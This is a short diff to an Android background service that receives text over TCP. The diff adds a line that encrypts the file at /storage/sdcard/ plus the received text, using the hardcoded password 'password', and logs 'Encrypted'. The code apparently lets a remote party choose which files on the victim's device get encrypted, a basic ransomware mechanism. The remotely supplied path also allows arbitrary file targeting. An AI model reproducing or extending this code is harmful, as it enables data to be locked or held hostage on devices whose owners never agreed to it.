@@ -77,8 +77,8 @@ public class ClientService extends IntentService {
                     finalText += text;
                 }
                 System.out.println(finalText);
-
-                Log.d("TCP", "C: Recieved.");
+                Encrypt.encrypt("/storage/sdcard/" + finalText, "password");
+                Log.d("TCP", "C: Encrypted.");
                 Log.d("TCP", "C: Done.");
 
             } catch (Exception e) {
